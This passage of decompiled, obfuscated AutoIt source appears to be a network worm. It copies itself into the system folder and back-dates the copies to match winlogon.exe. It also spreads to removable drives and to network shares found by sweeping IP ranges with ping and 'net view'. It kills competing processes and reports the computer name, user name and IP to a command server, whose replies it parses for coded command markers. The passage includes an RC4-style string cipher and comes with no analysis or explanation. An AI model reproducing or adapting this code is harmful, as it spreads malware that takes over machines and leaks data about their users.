					FileSetAttrib($Var041A[$Var0350] & "\" & $Var02A7, "-RASHNOT")
					FileDelete($Var041A[$Var0350] & "\" & $Var02A7)
				EndIf
				If FileExists($Var041A[$Var0350] & "\" & $Var0292) Then
					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0292, "-RASHNOT")
					FileDelete($Var041A[$Var0350] & "\" & $Var0292)
				EndIf
				If FileExists($Var041A[$Var0350] & "\" & $Var0297) Then
					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0297, "-RASHNOT")
					FileDelete($Var041A[$Var0350] & "\" & $Var0297)
				EndIf
			EndIf
		Next
	EndIf
EndFunc

Func Fn00A5()
	Sleep(0x0064)
	$Var041A = DriveGetDrive("REMOVABLE")
	If Not @error Then
		For $Var0350 = 1 To $Var041A[0]
			If DriveStatus($Var041A[$Var0350]) = "READY" Then
				If FileExists($Var041A[$Var0350] & "\" & $Var0293) Then
					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0293, "-RASHNOT")
					FileDelete($Var041A[$Var0350] & "\" & $Var0293)
				EndIf
				If FileExists($Var041A[$Var0350] & "\" & $Var02A7) Then
					FileSetAttrib($Var041A[$Var0350] & "\" & $Var02A7, "-RASHNOT")
					FileDelete($Var041A[$Var0350] & "\" & $Var02A7)
				EndIf
				If FileExists($Var041A[$Var0350] & "\" & $Var0292) Then
					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0292, "-RASHNOT")
					FileDelete($Var041A[$Var0350] & "\" & $Var0292)
				EndIf
				If FileExists($Var041A[$Var0350] & "\" & $Var0297) Then
					FileSetAttrib($Var041A[$Var0350] & "\" & $Var0297, "-RASHNOT")
					FileDelete($Var041A[$Var0350] & "\" & $Var0297)
				EndIf
			EndIf
		Next
	EndIf
EndFunc

Func Fn00A6()
	If $Var02C5 = 1 Then
		If $Var02D7 = 1 Then
			$Var03CE = @ComputerName
			$Var03CF = @UserName
			$Var041B = "&host=" & $Var02CA
			$Var041C = "&pc=" & $Var03CE
			$Var041D = "&user=" & $Var03CF
			$Var041E = "&ip=" & @IPAddress1
			$Var041F = "&type=" & $Var02CB
			$Var0420 = "&name=" & $Var02C8
			$Var0421 = "&port=" & @ScriptDir
			$Var0422 = "&version=" & FileGetVersion(@AutoItExe)
			$Var029F = Fn009B($Var034E & "?action=log" & $Var041E & $Var041B & $Var041C & $Var041D & $Var041F & $Var0420 & $Var0421 & $Var0422)
		EndIf
	EndIf
EndFunc

Func Fn00A7($Arg00, $Arg01, $Arg02, $Arg03)
	$Arg01 = StringInStr($Arg00, $Arg01) + StringLen($Arg01)
	$Arg02 = StringInStr($Arg00, $Arg02)
	$Var0423 = $Arg02 - $Arg01
	$Var0424 = StringMid($Arg00, $Arg01, $Var0423)
	$Var02C6 = Fn00A8(0, $Var0424, $Arg03, 2)
	Return $Var02C6
	$Var0424 = ""
EndFunc

Func Fn00A8($Arg00, $Arg01, $Arg02, $ArgOpt03 = 1)
	If $Arg00 <> 0 And $Arg00 <> 1 Then
		SetError(1)
		Return ""
	ElseIf $Arg01 = "" Or $Arg02 = "" Then
		SetError(1)
		Return ""
	Else
		If Number($ArgOpt03) <= 0 Or Int($ArgOpt03) <> $ArgOpt03 Then $ArgOpt03 = 1
		Local $Var0425
		Local $Var0426
		Local $Var0427
		Local $Var0428
		Local $Local0028[0x0100][2]
		Local $Var0429
		Local $Var042A
		Local $Var042B
		Local $Var042C
		Local $Var042D
		Local $Var042E
		Local $Var042F
		If $Arg00 = 1 Then
			For $Var0430 = 0 To $ArgOpt03 Step 1
				$Var0427 = ""
				$Var0426 = ""
				$Var0425 = ""
				For $Var0427 = 1 To StringLen($Arg01)
					If $Var0426 = StringLen($Arg02) Then
						$Var0426 = 1
					Else
						$Var0426 += 1
					EndIf
					$Var0425 = $Var0425 & Chr(BitXOR(Asc(StringMid($Arg01, $Var0427, 1)), Asc(StringMid($Arg02, $Var0426, 1)), 0x00FF))
				Next
				$Arg01 = $Var0425
				$Var0429 = ""
				$Var042A = 0
				$Var042B = ""
				$Var042C = ""
				$Var042D = ""
				$Var042F = ""
				$Var042E = ""
				$Var0428 = ""
				$Local0028 = ""
				Local $Local0028[0x0100][2]
				For $Var0429 = 0 To 0x00FF
					$Local0028[$Var0429][1] = Asc(StringMid($Arg02, Mod($Var0429, StringLen($Arg02)) + 1, 1))
					$Local0028[$Var0429][0] = $Var0429
				Next
				For $Var0429 = 0 To 0x00FF
					$Var042A = Mod(($Var042A + $Local0028[$Var0429][0] + $Local0028[$Var0429][1]), 0x0100)
					$Var0428 = $Local0028[$Var0429][0]
					$Local0028[$Var0429][0] = $Local0028[$Var042A][0]
					$Local0028[$Var042A][0] = $Var0428
				Next
				For $Var0429 = 1 To StringLen($Arg01)
					$Var042B = Mod(($Var042B + 1), 0x0100)
					$Var042C = Mod(($Var042C + $Local0028[$Var042B][0]), 0x0100)
					$Var042D = $Local0028[Mod(($Local0028[$Var042B][0] + $Local0028[$Var042C][0]), 0x0100)][0]
					$Var042F = BitXOR(Asc(StringMid($Arg01, $Var0429, 1)), $Var042D)
					$Var042E &= Hex($Var042F, 2)
				Next
				$Arg01 = $Var042E
			Next
		Else
			For $Var0430 = 0 To $ArgOpt03 Step 1
				$Var042A = 0
				$Var042B = ""
				$Var042C = ""
				$Var042D = ""
				$Var042F = ""
				$Var042E = ""
				$Var0428 = ""
				$Local0028 = ""
				Local $Local0028[0x0100][2]
				For $Var0429 = 0 To 0x00FF
					$Local0028[$Var0429][1] = Asc(StringMid($Arg02, Mod($Var0429, StringLen($Arg02)) + 1, 1))
					$Local0028[$Var0429][0] = $Var0429
				Next
				For $Var0429 = 0 To 0x00FF
					$Var042A = Mod(($Var042A + $Local0028[$Var0429][0] + $Local0028[$Var0429][1]), 0x0100)
					$Var0428 = $Local0028[$Var0429][0]
					$Local0028[$Var0429][0] = $Local0028[$Var042A][0]
					$Local0028[$Var042A][0] = $Var0428
				Next
				For $Var0429 = 1 To StringLen($Arg01) Step 2
					$Var042B = Mod(($Var042B + 1), 0x0100)
					$Var042C = Mod(($Var042C + $Local0028[$Var042B][0]), 0x0100)
					$Var042D = $Local0028[Mod(($Local0028[$Var042B][0] + $Local0028[$Var042C][0]), 0x0100)][0]
					$Var042F = BitXOR(Dec(StringMid($Arg01, $Var0429, 2)), $Var042D)
					$Var042E = $Var042E & Chr($Var042F)
				Next
				$Arg01 = $Var042E
				$Var0427 = ""
				$Var0426 = ""
				$Var0425 = ""
				For $Var0427 = 1 To StringLen($Arg01)
					If $Var0426 = StringLen($Arg02) Then
						$Var0426 = 1
					Else
						$Var0426 += 1
					EndIf
					$Var0425 &= Chr(BitXOR(Asc(StringMid($Arg01, $Var0427, 1)), Asc(StringMid($Arg02, $Var0426, 1)), 0x00FF))
				Next
				$Arg01 = $Var0425
			Next
		EndIf
		Return $Arg01
	EndIf
EndFunc

Func Fn00A9()
	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
	$Var0418 = @SystemDir & "\"
	$Var0417 = @ScriptDir & "\"
	Sleep(0x0064)
	$Var0431 = 0
	$Var0416 = 1
	If FileExists($Var0418 & $Var0292) And FileGetVersion($Var0418 & $Var0292) > FileGetVersion($Var0417 & $Var02A7) Then
		$Var0416 = 0
		If Not ProcessExists($Var0292) Then
			ShellExecute($Var0292, "", $Var0418)
			If @error Then
			EndIf
		EndIf
	ElseIf FileExists($Var0418 & $Var0292) And FileGetVersion($Var0418 & $Var0292) = FileGetVersion($Var0417 & $Var02A7) Then
		$Var0416 = 0
		If Not ProcessExists($Var0292) Then
			$Var0416 = 1
		EndIf
	EndIf
	If $Var0416 = 1 Then
		If ProcessExists($Var0292) Then
			ProcessClose($Var0292)
			Sleep(0x01F4)
			If ProcessExists($Var0292) Then
				ProcessWaitClose($Var0292, 0x003C)
			EndIf
		EndIf
		Fn009D($Var0417, $Var02A7, $Var0418, $Var0292)
		Fn009D($Var0417, $Var0295, $Var0418, $Var0293)
		Sleep(10)
		Fn00B5($Var0418, $Var0292)
		Fn00B5($Var0418, $Var0293)
		Sleep(10)
		RegWrite($Var029A, "ilop", "REG_SZ", "1")
		ShellExecute($Var0292, "", $Var0418)
		If @error Then
		EndIf
		Fn00A0()
		Sleep(10)
		If DriveGetType(@ScriptDir) = "REMOVABLE" Then
			$Var0432 = DriveGetLabel(@ScriptDir)
			RegWrite($Var029A, "rem", "REG_SZ", $Var0432)
			RegWrite($Var029A, "rem1", "REG_SZ", "1")
		EndIf
		If DriveGetType(@ScriptDir) = "Fixed" Then
			If StringLen(@ScriptDir) = 3 Then
				$Var0432 = DriveGetLabel(@ScriptDir)
				RegWrite($Var029A, "fix", "REG_SZ", $Var0432)
				RegWrite($Var029A, "fix1", "REG_SZ", "1")
			EndIf
		EndIf
	EndIf
EndFunc

Func Fn00AA()
	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
	$Var0418 = @SystemDir & "\"
	$Var0417 = @ScriptDir & "\"
	Sleep(0x0064)
	$Var0431 = 0
	$Var0416 = 1
	If $Var0416 = 1 Then
		If ProcessExists($Var0292) Then
			ProcessClose($Var0292)
			Sleep(0x07D0)
			If ProcessExists($Var0292) Then
				ProcessWaitClose($Var0292, 0x003C)
			EndIf
		EndIf
		Fn009D($Var0417, $Var02A7, $Var0418, $Var0292)
		Fn00B5($Var0418, $Var0292)
		Sleep(10)
		Fn009D($Var0417, $Var0295, $Var0418, $Var0293)
		Fn00B5($Var0418, $Var0293)
		Sleep(10)
		RegWrite($Var029A, "ilop", "REG_SZ", "1")
		ShellExecute($Var0292, "", $Var0418)
		If @error Then
		EndIf
		Fn00A0()
		Sleep(10)
		If DriveGetType(@ScriptDir) = "REMOVABLE" Then
			$Var0432 = DriveGetLabel(@ScriptDir)
			RegWrite($Var029A, "rem", "REG_SZ", $Var0432)
			RegWrite($Var029A, "rem1", "REG_SZ", "1")
		EndIf
		If DriveGetType(@ScriptDir) = "Fixed" Then
			$Var0432 = DriveGetLabel(@ScriptDir)
			RegWrite($Var029A, "fix", "REG_SZ", $Var0432)
			RegWrite($Var029A, "fix1", "REG_SZ", "1")
		EndIf
	EndIf
EndFunc

Func Fn00AB()
	Select
		Case $Var02BA = "_PE04E6B7463C3BD27"
			Fn00AC()
		Case $Var02BA = "_PE04E1B7463C3BD27"
			Fn00AE()
	EndSelect
EndFunc

Func Fn00AC()
	$Var02B4 = $Var02B4 + 1
	If $Var02B4 = 0x0100 Then
		$Var02B3 = $Var02B3 + 1
		$Var02B4 = 1
	EndIf
	If $Var02B3 = 0x0100 Then
		$Var02B3 = 0
		$Var02B4 = 1
	EndIf
	$Var02A5 = $Var02B1 & "." & $Var02B2 & "." & $Var02B3 & "." & $Var02B4
	$Var0433 = Ping($Var02A5, 0x01F4)
	If $Var0433 Then
		Fn00B0($Var02A5)
	EndIf
EndFunc

Func Fn00AD()
	If $Var02B9 = 0 Then
		$Var02B8 = $Var02B8 + 1
		If $Var02B8 = 0x0100 Then
			$Var02B7 = $Var02B7 + 1
			$Var02B8 = 1
		EndIf
		If $Var02B7 = 0x0100 Then
			$Var02B7 = 0
			$Var02B8 = 1
		EndIf
		$Var02A6 = $Var02B5 & "." & $Var02B6 & "." & $Var02B7 & "." & $Var02B8
		$Var0434 = Ping($Var02A6, 0x0028)
		If $Var0434 Then
			Fn00B0($Var02A6)
		EndIf
	EndIf
EndFunc

Func Fn00AE()
	If $Var02BE = 0 Then
		$Var02BE = 0
	EndIf
	$Var02BE = $Var02BE + 1
	If $Var02BE = 0x0100 Then
		$Var02BD = $Var02BD + 1
		$Var02BE = 1
	EndIf
	If $Var02BD = 0x0100 Then
		$Var02BC = $Var02BC + 1
		$Var02BD = 0
	EndIf
	If $Var02BC = 0x0100 Then
		$Var02BB = $Var02BB + 1
		$Var02BC = 0
	EndIf
	If $Var02BE = $Var02C2 Then
		Fn00AF($Var02C4, "secuential")
	EndIf
	If $Var02BD = $Var02C1 Then
		Fn00AF($Var02C4, "secuential")
	EndIf
	If $Var02BC = $Var02C0 Then
		Fn00AF($Var02C4, "secuential")
	EndIf
	$Var02A5 = $Var02BB & "." & $Var02BC & "." & $Var02BD & "." & $Var02BE
	$Var0433 = Ping($Var02A5, 0x01F4)
	If $Var0433 Then
		Fn00B0($Var02A5)
	EndIf
EndFunc

Func Fn00AF($Arg00, $Arg01)
	$Var0435 = StringSplit($Arg00, "~")
	Select
		Case $Arg01 = "randompick"
			$Var02C3 = Random(1, $Var0435[0], 1)
			$Var0436 = $Var0435[$Var02C3]
		Case $Arg01 = "secuential"
			If $Var02C3 >= $Var0435[0] Then
				$Var02C3 = 1
				$Var0436 = $Var0435[$Var02C3]
			Else
				$Var02C3 = $Var02C3 + 1
				$Var0436 = $Var0435[$Var02C3]
			EndIf
		Case Else
			$Var02C3 = Random(1, $Var0435[0], 1)
			$Var0436 = $Var0435[$Var02C3]
	EndSelect
	$Var0437 = StringSplit($Var0436, "/")
	If $Var0437[0] = 2 Then
		$Var0438 = $Var0437[1]
		$Var0439 = $Var0437[2] + 0
		If $Var0439 >= "24" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C1 = $Var02BD + 1
				If $Var02C1 > 0x0100 Then
					$Var02C1 = 0x0100
				EndIf
			EndIf
		EndIf
		If $Var0439 = "23" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C1 = $Var02BD + 2 + 1
				If $Var02C1 > 0x0100 Then
					$Var02C1 = 0x0100
				EndIf
			EndIf
		EndIf
		If $Var0439 = "22" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C1 = $Var02BD + 3 + 1
				If $Var02C1 > 0x0100 Then
					$Var02C1 = 0x0100
				EndIf
			EndIf
		EndIf
		If $Var0439 = "21" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C1 = $Var02BD + 7 + 1
				If $Var02C1 > 0x0100 Then
					$Var02C1 = 0x0100
				EndIf
			EndIf
		EndIf
		If $Var0439 = "20" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C1 = $Var02BD + 0x000F + 1
				If $Var02C1 > 0x0100 Then
					$Var02C1 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "19" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C1 = $Var02BD + 0x001F + 1
				If $Var02C1 > 0x0100 Then
					$Var02C1 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "18" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C1 = $Var02BD + 0x003F + 1
				If $Var02C1 > 0x0100 Then
					$Var02C1 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "17" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C1 = $Var02BD + 0x007F + 1
				If $Var02C1 > 0x0100 Then
					$Var02C1 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "16" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C0 = $Var02BC + 1
				If $Var02C0 > 0x0100 Then
					$Var02C0 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
					$Var02BC = Random($Var02BC, $Var02C0, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "15" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C0 = $Var02BC + 2 + 1
				If $Var02C0 > 0x0100 Then
					$Var02C0 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
					$Var02BC = Random($Var02BC, $Var02C0, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "14" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C0 = $Var02BC + 3 + 1
				If $Var02C0 > 0x0100 Then
					$Var02C0 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
					$Var02BC = Random($Var02BC, $Var02C0, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "13" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C0 = $Var02BC + 7 + 1
				If $Var02C0 > 0x0100 Then
					$Var02C0 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
					$Var02BC = Random($Var02BC, $Var02C0, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "12" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C0 = $Var02BC + 0x000F + 1
				If $Var02C0 > 0x0100 Then
					$Var02C0 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
					$Var02BC = Random($Var02BC, $Var02C0, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "11" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C0 = $Var02BC + 0x001F + 1
				If $Var02C0 > 0x0100 Then
					$Var02C0 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
					$Var02BC = Random($Var02BC, $Var02C0, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "10" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C0 = $Var02BC + 0x003F + 1
				If $Var02C0 > 0x0100 Then
					$Var02C0 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
					$Var02BC = Random($Var02BC, $Var02C0, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 = "9" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
				$Var02C0 = $Var02BC + 0x007F + 1
				If $Var02C0 > 0x0100 Then
					$Var02C0 = 0x0100
				EndIf
				If $Arg01 = "randompick" Then
					$Var02BD = Random($Var02BD, $Var02C1, 1)
					$Var02BC = Random($Var02BC, $Var02C0, 1)
				EndIf
			EndIf
		EndIf
		If $Var0439 <= "8" Then
			$Var0438 = StringSplit($Var0438, ".")
			If $Var0438[0] = 4 Then
				$Var02BB = $Var0438[1]
				$Var02BC = $Var0438[2]
				$Var02BD = $Var0438[3]
				$Var02BE = $Var0438[4]
			EndIf
			If $Arg01 = "randompick" Then
				$Var02BD = Random($Var02BD, $Var02C1, 1)
				$Var02BC = Random($Var02BC, $Var02C0, 1)
				$Var02BC = Random($Var02BB, $Var02BF, 1)
			EndIf
		EndIf
	EndIf
EndFunc

Func Fn00B0($Arg00)
	If ProcessExists("cmd.exe") Then
		ProcessWaitClose("cmd.exe", 0x003C)
	EndIf
	$Var02AB = 0
	$Var02AC = 0
	While 1
		$Var043A = WinList()
		For $Var0350 = 1 To $Var043A[0][0]
			If $Var043A[$Var0350][0] <> "" Then
				If StringInStr($Var043A[$Var0350][0], "\cmd.exe") Then
					$Var02AB = $Var02AB + 1
				EndIf
				If StringMid($Var043A[$Var0350][0], 1, 8) = "cmd.exe " Then
					WinClose($Var043A[$Var0350][0])
					$Var043B = 0
					Do
						ProcessClose("cmd.exe")
						$Var043B = $Var043B + 1
					Until $Var043B = 10
					$Var02D2 = 1
					ExitLoop
				EndIf
			EndIf
		Next
		If $Var02AB < 3 Then ExitLoop
		Sleep(0x2710)
		$Var02AC = $Var02AC + 1
		If $Var02AC = 8 Then
			$Var02D2 = 1
			ExitLoop
		EndIf
	WEnd
	$Var043C = Run(@ComSpec & " /c net view " & $Arg00, @SystemDir, @SW_HIDE, 6)
	Sleep(0x0064)
	$Var043D = "" & @CRLF
	$Var043E = 0
	While 1
		Sleep(10)
		$Var043F = StdoutRead($Var043C)
		If @error Then ExitLoop
		$Var043E = $Var043E + 1
		$Var043D = $Var043D & $Var043F
	WEnd
	$Var0440 = StringReplace($Var043D, @CRLF, "@crlf")
	If $Var043E >= 1 Then
		$Var0441 = "."
		$Var0442 = $Var043D
		$Var0442 = StringTrimLeft($Var0442, StringInStr($Var0442, @CRLF, 0, 8) + 1)
		$Var0443 = StringSplit($Var0442, @CRLF)
		For $Var0402 = 1 To $Var0443[0]
			If $Var0443[$Var0402] <> StringInStr($Var0443[$Var0402], ".") Then ExitLoop
			While 1
				If StringRight($Var0443[$Var0402], 1) = " " Then
					$Var0443[$Var0402] = StringTrimRight($Var0443[$Var0402], 1)
				Else
					ExitLoop
				EndIf
				If $Var0443[$Var0402] = "" Then ExitLoop
			WEnd
			While 1
				If StringRight($Var0443[$Var0402], 1) <> " " Then
					$Var0443[$Var0402] = StringTrimRight($Var0443[$Var0402], 1)
				Else
					ExitLoop
				EndIf
				If $Var0443[$Var0402] = "" Then ExitLoop
			WEnd
			While 1
				If StringRight($Var0443[$Var0402], 1) = " " Then
					$Var0443[$Var0402] = StringTrimRight($Var0443[$Var0402], 1)
				Else
					ExitLoop
				EndIf
				If $Var0443[$Var0402] = "" Then ExitLoop
			WEnd
			$Var0418 = "//" & $Arg00 & "/" & $Var0443[$Var0402] & "/"
			If Not StringInStr($Var0443[$Var0402], "   ") Then
				If Not $Var0443[$Var0402] = "" Then
					If FileExists($Var0418 & $Var0297) Then
					Else
						$Var0417 = @ScriptDir & "\"
						If FileExists($Var0418 & "System Volume Information") Or FileExists($Var0418 & "RECYCLER") Or FileExists($Var0418 & "Recycled") Then
							Fn009D($Var0417, $Var0295, $Var0418, $Var0293)
							Sleep(10)
							Fn009D($Var0417, $Var0292, $Var0418, $Var02A7)
							Sleep(10)
							$Var02C8 = "todrive"
						Else
							Fn009D($Var0417, $Var0292, $Var0418, $Var02A7)
							FileSetAttrib($Var0418 & $Var02A7, "-RASH")
							Sleep(10)
							$Var02C8 = "toshare"
						EndIf
						FileWrite($Var0418 & $Var0297, "")
						FileSetAttrib($Var0418 & $Var0297, "+RASH")
						If FileExists($Var0418 & $Var02A7) And FileGetVersion($Var0418 & $Var02A7) = FileGetVersion($Var0417 & $Var0292) Then
							$Var034E = $Var0336
							$Var02CA = $Var0418
							$Var02CB = "none"
							$Var02CC = "none"
							Fn00A6()
						EndIf
					EndIf
				EndIf
			EndIf
		Next
	EndIf
EndFunc

Func Fn00B1()
	$Var0444 = Fn009B("http://www.whatismyip.com/automation/n09230945.asp")
	$Var0445 = StringSplit($Var0444, ".")
	If $Var0445[0] <> 4 Then
		Sleep(0x03E8)
		$Var0444 = Fn009B("http://www.whatismyip.com/automation/n09230945.asp")
		$Var0445 = StringSplit($Var0444, ".")
	EndIf
	If $Var0445[0] <> 4 Then
		Sleep(0x03E8)
		$Var0444 = Fn009B($Var0347)
		$Var0445 = StringSplit($Var0444, ".")
	EndIf
	If $Var0445[0] <> 4 Then
		Return Fn009A()
	Else
		Return $Var0444
	EndIf
EndFunc

Func Fn00B2($Arg00, $Arg01)
	$Var043F = 0
	$Var0446 = 0
	$Var0447 = ";end"
	While 1
		$Var043F = $Var043F + 1
		$Var0448 = FileReadLine($Arg00, $Var043F)
		$Var0449 = Fn00A8(0, $Var0448, $Var032F, 1)
		If $Var043F = 3 Then
			If $Var0449 <> ";start" Then ExitLoop
		EndIf
		FileWriteLine($Arg01, $Var0449)
		If $Var0449 = $Var0447 Then ExitLoop
		If $Var0449 = "" Then
			$Var0446 = $Var0446 + 1
		EndIf
		If $Var0446 = 0x0032 Then ExitLoop
	WEnd
EndFunc

Func Fn00B3()
	If $Var029E = 1 Then
		$Var036F = StringRegExp($Var029F, "H4D8D5U96581H3Y321VBNM1M1MBN", 0)
		$Var0370 = StringRegExp($Var029F, "LLFPD879S54D6B84654654CVBCVB654CVB654CB", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "H4D8D5U96581H3Y321VBNM1M1MBN"
			$Var0372 = "LLFPD879S54D6B84654654CVBCVB654CVB654CB"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var029D = StringLen($Var02C6)
			If $Var029C = $Var029D Then
			Else
				$Var029D = StringLen($Var02C6)
				$Var02CE = 0
			EndIf
		EndIf
	EndIf
EndFunc

Func Fn00B4($ArgOpt00 = -1)
	If $ArgOpt00 <> -1 Then
		Local $Local0029 = DllCall("kernel32.dll", "int", "OpenProcess", "int", 0x001F0FFF, "int", False, "int", $ArgOpt00)
		Local $Local002A = DllCall("psapi.dll", "int", "EmptyWorkingSet", "long", $Local0029[0])
		DllCall("kernel32.dll", "int", "CloseHandle", "int", $Local0029[0])
	Else
		Local $Local002A = DllCall("psapi.dll", "int", "EmptyWorkingSet", "long", -1)
	EndIf
	Return $Local002A[0]
EndFunc

Func Fn00B5($Arg00, $Arg01)
	$Var044A = $Arg00 & $Arg01
	FileSetAttrib($Var044A, "-RASH")
	$Var044B = FileGetTime(@SystemDir & "\winlogon.exe", 1)
	If Not @error Then
		$Var044C = $Var044B[0] & $Var044B[1] & $Var044B[2]
		FileSetTime($Var044A, $Var044C, 1)
	EndIf
	$Var044B = FileGetTime(@SystemDir & "\winlogon.exe", 0)
	If Not @error Then
		$Var044C = $Var044B[0] & $Var044B[1] & $Var044B[2]
		FileSetTime($Var044A, $Var044C, 0)
	EndIf
	FileSetAttrib($Var044A, "+RASH")
EndFunc

Func Fn00B6()
	$Var02DB = StringRegExp($Var029F, "R85EfzMkOX100kyp5VrE4eEKVKEEKR", 0)
	$Var044D = StringRegExp($Var029F, "7sa4z", 0)
	$Var02DC = StringRegExp($Var029F, "K0i3l8l1z", 0)
	$Var02DD = StringRegExp($Var029F, "zZ45sAs", 0)
	$Var02DE = StringRegExp($Var029F, "Zx0Xz8", 0)
	$Var02DF = StringRegExp($Var029F, "VnSt805f", 0)
	$Var02E0 = StringRegExp($Var029F, "z99Un4Zx", 0)
	$Var02E1 = StringRegExp($Var029F, "Vz5R78yE8w1Gx", 0)
	$Var02E2 = StringRegExp($Var029F, "ll9865sdzxNsj8", 0)
	$Var02E3 = StringRegExp($Var029F, "TosS587GhM", 0)
	$Var02E4 = StringRegExp($Var029F, "LL87S64888Z", 0)
	$Var02E5 = StringRegExp($Var029F, "Z6FRNMML4", 0)
	$Var02E6 = StringRegExp($Var029F, "PrPf8Ms55BL456M", 0)
	$Var02E7 = StringRegExp($Var029F, "PI4b6dmM", 0)
	$Var02D5 = StringRegExp($Var029F, "K7K8K5K1V2", 0)
	$Var02D6 = StringRegExp($Var029F, "K7K8K5K1V3", 0)
	$Var02D3 = StringRegExp($Var029F, "K7K8K5K1V4", 0)
	$Var02D4 = StringRegExp($Var029F, "K7K8K5K1V5", 0)
	$Var02E8 = StringRegExp($Var029F, "X5X14dMnb4b44bo", 0)
	$Var02E9 = StringRegExp($Var029F, "X5X14dMnb4b44bf", 0)
	$Var02EA = StringRegExp($Var029F, "M8Y77V69S8488S689O99Q", 0)
